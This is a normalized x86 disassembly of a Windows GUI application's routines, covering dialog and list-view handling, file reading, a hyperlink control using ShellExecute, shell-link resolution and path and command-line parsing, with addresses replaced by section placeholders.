mov edx [ ecx + edi * 4 ]
mov [ edx + 0xb0 ] 0x0
push esi
lea ecx [ esp + 0x50 ]
call sub_453720
mov ebx [ esp + 0x54 ]
mov ebp [ esp + 0x50 ]
cmp edx eax
jne r-xdata
test ebp ebp
jne r-xdata
push ebx
call j_sub_4b573e#2
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
cmp [ esi + 0x80 ] edi
jb r-xdata
mov ecx rw-data
call sub_401420
jmp r-xdata
mov edx [ esp + 0x914 ]
push 0xce6
push edx
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x1004
push esi
call ebp
xor edi edi
test eax eax
mov [ esp + 0x10 ] eax
jle r-xdata
mov edx [ esp + 0x914 ]
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push edx
push eax
call sub_4863a0
add esp 0x2c
lea eax [ esp + 0x20 ]
cmp eax 0xc
je r-xdata
mov dl 0x7b
mov bl 0x61
lea edx [ esp + 0x304 ]
push edx
lea eax [ esp + 0x108 ]
push eax
call [ lstrcatA@IAT ]
mov edx [ esp + 0x914 ]
lea ecx [ esp + 0x104 ]
push ecx
push 0x0
push 0x1411
push edx
call [ SendMessageA@IAT ]
mov ecx rw-data
call sub_401420
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xd0 ] 0x10
jb r-xdata
mov esi [ ebx + 0xd4 ]
cmp esi edi
je r-xdata
push 0x0
push 0x2
push 0x0
push ebx
push edx
call sub_4b1c90
add esp 0x14
mov ecx rw-data
call sub_401420
jmp r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx rw-data
call sub_401490
mov esi eax
test esi esi
jle r-xdata
push eax
lea ecx [ esp + 0x20 ]
call sub_453790
mov ecx [ rw-data ]
mov edx [ ecx + esi * 4 ]
mov [ edx + 0x24 ] ebp
mov eax [ rw-data ]
mov ecx [ eax + esi * 4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi + 0x4c ]
lea eax [ ebx - 0x1 ]
cdq
cmp ecx edx
jl r-xdata
lea eax [ esi + 0x6c ]
mov eax [ esi + 0x6c ]
jmp r-xdata
cmp eax 0xd
je r-xdata
dec eax
mov [ esp + eax + 0x105 ] bl
js r-xdata
lea eax [ ebx + 0xbc ]
mov eax [ ebx + 0xbc ]
jmp r-xdata
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
cmp [ ebx + 0x20 ] 0x10
mov [ esp + 0x90c ] 0x5
jb r-xdata
mov ecx [ ebx + 0x48 ]
mov edx ecx
shr ecx 0x2
mov edi ebp
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x48 ]
mov [ eax + ebp ] 0x0
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x14 ]
push 0x2
mov edi esi
sub edi ebp
push edi
push 0x102c
push ecx
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp esi eax
jge r-xdata
mov eax [ esp + 0x20 ]
push 0xffffffff
push 0x1
push eax
push edi
call [ WaitForMultipleObjects@IAT ]
test esi esi
jle r-xdata
mov ebx esi
jmp r-xdata
push 0x2
push eax
call edi
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
mov ecx [ eax + 0x28 ]
cmp ecx ebp
je r-xdata
mov ebx [ esi + 0x48 ]
jg r-xdata
cmp [ eax + 0x1 ] 0x65
jne r-xdata
cmp [ eax ] 0x74
jne r-xdata
cmp eax 0xe
je r-xdata
mov cl [ esp + eax + 0x104 ]
inc cl
cmp cl dl
mov [ esp + eax + 0x104 ] cl
je r-xdata
mov edx [ ebx + 0x48 ]
push edi
lea ecx [ esp + 0x40 ]
push ecx
push edx
push ebp
push esi
call [ ReadFile@IAT ]
mov eax [ esp + 0x3c ]
push esi
mov [ eax + ebp ] 0x0
call [ CloseHandle@IAT ]
push edi
push edi
push 0x3
push edi
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
sub edx ecx
sar edx 0x2
mov eax edx
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax + esi * 4 ]
mov [ eax + edi * 4 ] ecx
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
mov eax [ eax + 0xd4 ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
mov ecx rw-data
call sub_401420
dec ebx
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
call ebx
mov ecx [ rw-data ]
mov edx [ ecx + esi * 4 ]
mov [ edx + 0x4 ] 0xffffffff
cmp ecx 0x2
jne r-xdata
cmp [ esi + 0xd0 ] edi
jb r-xdata
mov esi [ esi + 0xd4 ]
test esi esi
je r-xdata
dec ebx
jmp r-xdata
mov edx [ esi + 0x48 ]
cmp edx eax
jbe r-xdata
cmp [ eax + 0x2 ] 0x78
jne r-xdata
cmp eax 0xf
jne r-xdata
push ebp
call j_sub_4b66ed
add esp 0x4
lea ecx [ esp + 0x1c ]
call sub_403ab0
mov ecx rw-data
call sub_401420
jmp r-xdata
mov esi [ esp + 0x20 ]
mov ebx [ SendMessageA@IAT ]
add esi 0x4
nop
lea ecx [ esp + 0x1c ]
push ecx
push ebx
push ebp
call sub_454ba0
add esp 0xc
lea ecx [ esp + 0x1c ]
xor edi edi
call sub_4010c0
test eax eax
jle r-xdata
mov esi [ esp + 0x914 ]
push 0x0
push 0xcea
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
push 0x0
push 0x3000ce5
push 0x111
push esi
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
push 0x0
sub eax ebp
push eax
mov ecx rw-data
call sub_46a8c0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov edx [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + esi * 4 ]
mov eax [ edx + 0xac ]
test eax eax
je r-xdata
push eax
call [ LocalFree@IAT ]
add esi 0xbc
mov esi [ esi + 0xbc ]
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x914 ]
push edx
push ebx
push ebp
push eax
mov [ ebx + ebp ] 0x0
call sub_42bed0
push ebp
call j_sub_4b66ed
add esp 0x14
mov ecx ebx
mov eax ecx
shr ecx 0x2
mov edi ebp
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax [ esi + 0xcc ]
test eax eax
jne r-xdata
cmp [ eax + 0x3 ] 0x74
jne r-xdata
mov ecx rw-data
call sub_401420
lea ecx [ esp + 0x4c ]
push ecx
call [ GetCursorPos@IAT ]
mov edx [ esp + 0x914 ]
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x4c ]
push 0x0
push edx
push 0x0
push eax
push ecx
push 0x0
push ebx
call [ TrackPopupMenu@IAT ]
push ebp
call [ DestroyMenu@IAT ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + esi * 4 ]
test ebx ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push ebx
push ebp
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push esi
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov [ esp + 0x10 ] 0x0
mov ebx 0x10000
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edx [ esp + 0x914 ]
push eax
push 0x10000
push 0x1410
push edx
call ebx
lea ecx [ esp + 0x1c ]
inc edi
add esi 0x1c
call sub_4010c0
cmp edi eax
jl r-xdata
mov ecx rw-data
call sub_401420
jmp r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x14 ]
mov ecx [ rw-data ]
push 0x0
push edi
push 0x1008
push edx
mov [ ecx + esi * 4 ] 0x0
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
inc ebp
cmp esi eax
jne r-xdata
mov ecx ebx
call sub_453080
push ebx
call j_sub_4b66ed#2
add esp 0x4
inc esi
jmp r-xdata
mov eax [ esp + 0x914 ]
push r--data
push 0x0
push 0xc
push 0xcec
push eax
mov [ rw-data ] 0xffffffff
call [ SendDlgItemMessageA@IAT ]
inc esi
jmp r-xdata
sub_457560
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
push 0x0
push sub_455190
push eax
push 0xc1c
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
push 0x5
push eax
mov [ rw-data ] eax
call [ ShowWindow@IAT ]
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
setne al
retn
push eax
call [ SetFocus@IAT ]
mov eax 0x1
retn
sub_4575c0
mov ecx [ rw-data ]
sub esp 0x10
test ecx ecx
push ebx
mov ebx [ rw-data ]
push esi
jne r-xdata
mov eax ebx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
test edx edx
push ebp
push edi
mov edi [ rw-data ]
jne r-xdata
test eax eax
jle r-xdata
lea edx [ eax - 0x1 ]
mov eax [ rw-data ]
cmp edx eax
jl r-xdata
mov eax edi
sub eax edx
sar eax 0x4
xor eax eax
jmp r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
mov edx [ rw-data ]
xor esi esi
xor ecx ecx
sub ebx ecx
mov ecx ebx
sar ecx 0x2
cmp eax ecx
jae r-xdata
test ecx ecx
je r-xdata
mov eax ebx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
push 0x0
push 0x0
push edi
push esi
push ebx
push ebp
push 0xcf0000
push 0x0
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov esi eax
xor ebp ebp
cmp esi ebp
jne r-xdata
lea eax [ ecx - 0x1 ]
shl eax 0x4
mov ebp [ eax + edx ]
mov esi [ eax + edx + 0x8 ]
mov ebx [ eax + edx + 0x4 ]
mov edi [ eax + edx + 0xc ]
add eax edx
sub esi ebp
sub edi ebx
jmp r-xdata
test edx edx
je r-xdata
cmp [ ecx + esi * 4 ] edx
jne r-xdata
cmp esi eax
jge r-xdata
mov ebx [ GetWindowLongA@IAT ]
push 0xffffffeb
push esi
call ebx
mov ecx [ rw-data ]
push 0xffffffeb
push ecx
mov edi eax
call ebx
mov edx [ rw-data ]
mov eax edx
cmp eax ebp
mov [ edi ] edx
mov [ edi + 0x12c ] ebp
mov ebx [ rw-data ]
jne r-xdata
pop edi
pop ebp
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
mov ecx [ rw-data ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ GetClientRect@IAT ]
push 0x0
push 0xcf0000
lea edx [ esp + 0x18 ]
push edx
call [ AdjustWindowRect@IAT ]
mov esi [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
mov ebp 0x80000000
sub esi ecx
mov ebx ebp
sub edi eax
jmp r-xdata
mov eax edi
sub eax edx
sar eax 0x4
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ecx + esi * 4 ]
push 0x0
push eax
push 0x600
push ecx
call [ PostMessageA@IAT ]
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
pop esi
pop ebx
add esp 0x10
retn
inc esi
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x21
call esi
push 0x4
mov ebp eax
call esi
add ebp eax
mov eax [ edi - 0x10 ]
mov edi [ rw-data ]
push 0x21
add ebp eax
call esi
push 0x4
mov ebx eax
call esi
mov esi [ edi - 0xc ]
add ebx eax
mov eax [ rw-data ]
mov edx [ eax - 0x10 ]
mov edi [ eax - 0x4 ]
mov ecx [ eax - 0xc ]
add ebx esi
mov esi [ eax - 0x8 ]
sub esi edx
sub edi ecx
test ecx ecx
jne r-xdata
push esi
call sub_466150
mov ecx [ rw-data ]
mov edi [ SendMessageA@IAT ]
add esp 0x4
push ebp
push ecx
push 0x600
push esi
call edi
push esi
call [ UpdateWindow@IAT ]
push ebp
push ebp
push ebp
push ebx
call edi
pop edi
pop ebp
mov eax esi
pop esi
pop ebx
add esp 0x10
retn
mov [ edi + 0x130 ] ebp
push 0x1
push esi
call [ DragAcceptFiles@IAT ]
jmp r-xdata
push esi
call sub_495c30
add esp 0x4
push 0x27
push ebp
push ebp
push ebp
push ebp
mov [ edi + 0x12c ] eax
mov eax [ rw-data ]
push ebp
push eax
call [ SetWindowPos@IAT ]
sub_457810
mov eax [ esp + 0x8 ]
sub esp 0x164
cmp eax 0x110
push esi
push edi
ja r-xdata
sub eax 0x111
je r-xdata
je r-xdata
movzx eax [ esp + 0x178 ]
dec eax
je r-xdata
sub eax 0x27
je r-xdata
mov ecx [ rw-data ]
mov edi [ GetWindowRect@IAT ]
lea eax [ esp + 0x8 ]
push eax
push ecx
call edi
mov esi [ esp + 0x170 ]
lea edx [ esp + 0x18 ]
push edx
push esi
call edi
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
sub eax ecx
mov ecx [ esp + 0xc ]
sub eax ecx
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x20 ]
push 0x5
push 0x0
push 0x0
push eax
mov eax [ esp + 0x28 ]
sub eax ecx
mov ecx [ esp + 0x18 ]
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push esi
call [ SetWindowPos@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x80
push 0x0
push 0x1
push 0x0
push 0x190
push 0x0
push 0x0
push 0x0
push 0x10
call [ CreateFontA@IAT ]
mov edi [ SetDlgItemTextA@IAT ]
push r--data
push 0x551
push esi
mov [ rw-data ] eax
call edi
mov eax [ rw-data ]
push 0x0
push eax
push 0x30
push 0xce4
push esi
call [ SendDlgItemMessageA@IAT ]
push r--data
push 0xce4
push esi
call edi
push 0xf8
lea ecx [ esp + 0x6c ]
push ecx
call [ GetWindowsDirectoryA@IAT ]
push r--data
lea edx [ esp + 0x6c ]
push edx
call [ lstrcatA@IAT ]
lea eax [ esp + 0x68 ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
sub eax 0x2
je r-xdata
mov edx [ esp + 0x170 ]
push 0x1
push edx
dec eax
je r-xdata
mov ecx [ esp + 0x170 ]
push 0xce4
push ecx
call [ GetDlgItem@IAT ]
cmp [ esp + 0x17c ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x164
retn 0x10
push 0x6a
push edi
call [ LoadCursorA@IAT ]
push eax
call [ CopyIcon@IAT ]
push edi
mov [ rw-data ] eax
call [ FreeLibrary@IAT ]
push 0x7f00
push eax
call [ LoadCursorA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ rw-data ]
push edx
call [ DestroyCursor@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x164
retn 0x10
sub eax 0xd
je r-xdata
mov ecx [ esp + 0x170 ]
push 0x2
push ecx
jmp r-xdata
sub eax 0xce2
jne r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x164
retn 0x10
mov edx [ rw-data ]
mov esi [ esp + 0x178 ]
push edx
push esi
call [ SelectObject@IAT ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
push ecx
push esi
call [ SetTextColor@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
push 0x5
call [ GetStockObject@IAT ]
pop edi
pop esi
add esp 0x164
retn 0x10
push 0x6e
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
push eax
call [ LoadIconA@IAT ]
pop edi
mov [ rw-data ] eax
mov eax 0x1
pop esi
add esp 0x164
retn 0x10
mov esi [ esp + 0x170 ]
lea ecx [ esp + 0x28 ]
push ecx
push esi
call [ BeginPaint@IAT ]
mov edx [ rw-data ]
push edx
push 0x14
push 0x14
push eax
call [ DrawIcon@IAT ]
lea eax [ esp + 0x28 ]
push eax
push esi
call [ EndPaint@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x164
retn 0x10
sub eax 0x11
jne r-xdata
call [ EndDialog@IAT ]
mov esi [ esp + 0x170 ]
mov edi [ GetDlgItem@IAT ]
push 0x100
lea edx [ esp + 0x6c ]
push edx
push 0xce4
push esi
mov [ rw-data ] 0x1
call edi
push eax
call [ GetWindowTextA@IAT ]
push 0x1
push 0x0
push 0x0
lea eax [ esp + 0x74 ]
push eax
push r--data
push esi
call [ ShellExecuteA@IAT ]
push 0x0
push 0x0
push 0xce4
push esi
call edi
push eax
call [ InvalidateRect@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x164
retn 0x10
mov esi [ esp + 0x170 ]
push 0xce4
push esi
call [ GetDlgItem@IAT ]
cmp [ esp + 0x178 ] eax
jne r-xdata
mov eax [ rw-data ]
push eax
call [ SetCursor@IAT ]
push 0x1
push 0x0
push esi
call [ SetWindowLongA@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x164
retn 0x10
sub_457b80
sub esp 0x100
push ebp
push 0x0
push edi
push esi
call [ GetDlgItem@IAT ]
mov ebp [ SendDlgItemMessageA@IAT ]
push eax
push 0x469
push ebx
push esi
call ebp
mov eax [ esp + 0x10c ]
mov ecx [ esp + 0x108 ]
push eax
push ecx
push 0x46f
push ebx
push esi
call ebp
mov edx [ esp + 0x110 ]
push edx
lea eax [ esp + 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x4 ]
push ecx
push edi
push esi
call [ SetDlgItemTextA@IAT ]
pop ebp
add esp 0x100
retn
sub_457c30
push ebx
mov ebx [ GetDlgItem@IAT ]
push 0xfffffff0
push esi
push edi
call ebx
push eax
call [ GetWindowLongA@IAT ]
or eax 0x40
push eax
push 0xfffffff0
push esi
push edi
call ebx
push eax
call [ SetWindowLongA@IAT ]
movzx eax [ esp + 0xc ]
movzx ecx [ esp + 0x8 ]
mov ebx [ SendDlgItemMessageA@IAT ]
shl eax 0x10
or eax ecx
push eax
push 0x0
push 0x406
push esi
push edi
call ebx
push 0x0
push 0xc
push 0x41b
push esi
push edi
call ebx
mov edx [ esp + 0x10 ]
push edx
push 0x1
push 0x405
push esi
push edi
call ebx
pop ebx
retn
sub_457ca0
sub esp 0x100
push 0x100
lea eax [ esp + 0x4 ]
push eax
push ecx
push edx
call [ GetDlgItemTextA@IAT ]
lea eax [ esp ]
push eax
call j_sub_4b692d
mov ecx [ esp + 0x114 ]
mov [ ecx ] eax
add esp 0x104
retn
sub_457d00
cmp ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi ebx
jg r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ IsDlgButtonChecked@IAT ]
mov eax [ esp + 0x18 ]
sub esi ebx
mov [ eax ] esi
pop edi
mov eax [ esp + 0x14 ]
inc esi
cmp esi eax
jle r-xdata
push esi
push ebp
call edi
cmp eax 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
sub_457d70
test edx edx
je r-xdata
push 0x0
push eax
push ecx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
retn
push 0x1
push eax
push ecx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
retn
sub_457da0
mov eax [ esp + 0x4 ]
sub esp 0x244
push ebx
mov ebx [ esp + 0x250 ]
push ebp
push esi
push edi
push 0x104
push eax
lea ecx [ esp + 0x18 ]
push ecx
mov [ ebx ] 0x0
xor esi esi
call [ lstrcpynA@IAT ]
mov al [ esp + 0x10 ]
test al al
lea ebp [ esp + 0x10 ]
je r-xdata
mov edi [ esp + 0x260 ]
cmp [ esp + 0x11 ] 0x3a
jne r-xdata
lea eax [ esp + 0x114 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
mov [ ebp ] 0x0
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
test bl bl
je r-xdata
cmp [ esp + 0x12 ] 0x5c
jne r-xdata
mov edx [ esp + 0x25c ]
pop edi
pop esi
pop ebp
mov [ edx ] 0x0
xor eax eax
pop ebx
add esp 0x244
retn
push eax
call [ FindClose@IAT ]
cmp edi esi
jbe r-xdata
xor bl 0x20
add bl 0x5f
cmp bl 0x3b
ja r-xdata
mov edi [ esp + 0x260 ]
cmp edi 0x3
mov eax 0x4
ja r-xdata
cmp bl 0x5c
mov [ ebp ] bl
jne r-xdata
mov ecx [ esp + 0x25c ]
mov edx edi
sub edx esi
push edx
lea eax [ esp + 0x144 ]
push eax
lea edx [ esi + ecx ]
push edx
call [ lstrcpynA@IAT ]
lea eax [ esp + 0x140 ]
push eax
call [ lstrlenA@IAT ]
sub edi esi
lea ecx [ edi - 0x1 ]
cmp eax ecx
jbe r-xdata
inc ebp
jmp r-xdata
add ebp 0x2
jmp r-xdata
push eax
lea edx [ esp + 0x14 ]
push edx
push ebx
call [ lstrcpynA@IAT ]
lea ebp [ esp + 0x13 ]
mov esi 0x3
jmp r-xdata
mov eax edi
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x244
retn
mov eax [ esp + 0x260 ]
lea edi [ esi + 0x1 ]
cmp eax edi
jbe r-xdata
add esi eax
mov eax ecx
mov bl [ ebp ]
cmp bl 0x5c
je r-xdata
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
mov ecx [ esp + 0x25c ]
push r--data
add esi ecx
push esi
call [ lstrcpyA@IAT ]
mov esi edi
sub_457f00
push esi
mov esi [ esp + 0x8 ]
mov cl [ esi ]
push edi
xor edi edi
xor eax eax
test cl cl
je r-xdata
mov cl [ edi + esi ]
neg cl
pop edi
pop esi
sbb ecx ecx
and eax ecx
retn
mov cl [ eax + esi ]
mov dl cl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
cmp cl 0x5c
jne r-xdata
add eax 0x2
jmp r-xdata
inc eax
lea edi [ eax + 0x1 ]
cmp [ eax + esi ] 0x0
jne r-xdata
sub_457f40
push ebp
mov ebp [ esp + 0x8 ]
mov al [ ebp ]
push edi
xor edi edi
test al al
je r-xdata
mov al [ edi + ebp ]
neg al
sbb eax eax
and eax edi
pop edi
pop ebp
retn
push esi
mov ecx ebp
mov esi 0x1
cmp al 0x5c
jne r-xdata
add esi 0x2
add ecx 0x2
jmp r-xdata
inc esi
inc ecx
mov edi esi
cmp [ ecx ] 0x0
jne r-xdata
mov al [ ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
pop esi
sub_457f90
mov edx [ esp + 0x4 ]
mov al [ edx ]
push edi
xor edi edi
test al al
je r-xdata
mov eax edi
pop edi
retn
push esi
mov esi 0x1
cmp cl 0x2f
je r-xdata
add esi 0x2
add edx 0x2
jmp r-xdata
mov edi esi
cmp cl 0x5c
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov cl [ edx ]
mov al cl
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
pop esi
inc esi
inc edx
sub_457fd0
mov edx [ esp + 0x4 ]
mov al [ edx ]
push esi
xor esi esi
test al al
je r-xdata
mov eax esi
pop esi
retn
lea ecx [ ecx ]
cmp cl 0x5c
je r-xdata
add edx 0x2
jmp r-xdata
inc esi
cmp cl 0x2f
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov cl [ edx ]
mov al cl
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
inc edx
sub_458010
push ebp
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
call [ lstrlenA@IAT ]
mov esi eax
xor edx edx
test esi esi
mov ebp esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov cl [ edx + edi ]
mov al cl
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
cmp cl 0x2e
jne r-xdata
inc edx
jmp r-xdata
inc edx
cmp edx ebp
jl r-xdata
mov esi edx
sub_458050
sub esp 0x104
push esi
mov esi [ esp + 0x10c ]
mov cl [ esi ]
test cl cl
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x3a
je r-xdata
push rw-data
call sub_457f40
add esp 0x4
push eax
push rw-data
push esi
call [ lstrcpynA@IAT ]
mov eax esi
pop esi
add esp 0x104
retn
mov eax esi
pop esi
add esp 0x104
retn
cmp cl 0x5c
jne r-xdata
push esi
lea eax [ esp + 0x8 ]
push eax
call [ lstrcpyA@IAT ]
push rw-data
call sub_457f40
add esp 0x4
inc eax
push eax
push rw-data
push esi
call [ lstrcpynA@IAT ]
lea ecx [ esp + 0x4 ]
push ecx
push esi
call [ lstrcatA@IAT ]
cmp al cl
je r-xdata
sub_4580e0
sub esp 0x454
push edi
push 0x0
call [ CoInitialize@IAT ]
lea eax [ esp + 0x4 ]
push eax
push r--data
push 0x1
xor edi edi
push edi
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
call [ CoUninitialize@IAT ]
mov eax edi
pop edi
add esp 0x454
retn
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
lea edx [ esp + 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push esi
mov esi [ esp + 0x460 ]
push 0x104
lea eax [ esp + 0x258 ]
push eax
push 0xffffffff
push esi
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push edi
lea edx [ esp + 0x258 ]
push edx
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
pop esi
mov edx [ esp + 0x464 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push 0x2
push edx
push eax
call [ ecx + 0x4c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push edi
lea edx [ esp + 0x118 ]
push edx
push 0x104
lea edx [ esp + 0x1c ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
call [ lstrcpyA@IAT ]
mov edi 0x1
sub_4581e0
mov edx [ esp + 0x4 ]
push ebx
mov bl 0x40
inc eax
mov [ edx ] eax
jmp r-xdata
cmp cl 0x9
je r-xdata
mov eax [ edx ]
mov cl [ eax ]
cmp cl 0x20
je r-xdata
movsx ecx cl
cmp ecx 0x81
jne r-xdata
mov ecx [ edx ]
mov al [ ecx ]
test al al
jne r-xdata
cmp [ eax + 0x1 ] bl
jne r-xdata
cmp al 0x22
mov [ esp + 0x8 ] 0x0
je r-xdata
mov eax 0xffffffff
pop ebx
retn
add eax 0x2
mov [ edx ] eax
jmp r-xdata
inc ecx
mov [ esp + 0x8 ] al
mov [ edx ] ecx
cmp al 0x27
jne r-xdata
cmp ebp esi
ja r-xdata
mov ecx [ edx ]
mov al [ ecx + ebp ]
mov bl al
xor bl 0x20
add bl 0x5f
cmp bl 0x3b
ja r-xdata
push ebp
push esi
mov esi [ esp + 0x18 ]
xor ebp ebp
dec esi
test esi esi
jbe r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax [ esp + 0x14 ]
mov esi [ edx ]
push edi
mov ecx ebp
mov ebx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov cl [ esp + 0x14 ]
mov [ eax + ebp ] 0x0
mov esi [ edx ]
add esi ebp
test cl cl
mov [ edx ] esi
mov eax esi
pop edi
je r-xdata
mov bl [ esp + 0x10 ]
test bl bl
jne r-xdata
cmp [ ecx ] 0x2d
jne r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
inc eax
mov [ edx ] eax
test al al
je r-xdata
cmp [ ecx ] 0x2d
jne r-xdata
add ebp 0x2
jmp r-xdata
mov bl [ esp + 0x10 ]
test bl bl
jne r-xdata
cmp al bl
cmp al 0x9
je r-xdata
cmp al 0x20
je r-xdata
cmp ebp esi
jb r-xdata
movsx eax al
cmp eax 0x81
jne r-xdata
inc ebp
test al al
jmp r-xdata
cmp [ ecx + ebp + 0x1 ] 0x40
je r-xdata
je r-xdata
sub_4582e0
mov eax 0x8000
call sub_4b6180
push 0x8000
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x800c ]
push ecx
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
mov eax 0x1
add esp 0x8000
retn
push ebx
push ebp
mov ebp [ lstrcmpiA@IAT ]
push esi
mov esi [ esp + 0x8014 ]
push edi
mov edi [ lstrcpynA@IAT ]
